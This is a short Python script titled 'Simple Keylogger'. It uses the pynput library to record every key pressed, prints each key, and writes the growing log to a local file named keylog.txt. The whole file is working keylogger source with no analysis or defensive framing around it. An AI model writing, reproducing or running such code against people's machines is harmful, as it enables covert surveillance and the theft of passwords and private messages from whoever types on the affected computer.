#Simple Keylogger
#Recording logs and keystrokes
#Log the keys pressed and save them to a file

import pynput.keyboard

log = ""
def on_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        log = log + " " + str(key) + " "
    print(key)

    # Write the logged keys to a file
    with open("keylog.txt", "w") as f:
        f.write(log)

# Create a listener instance
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
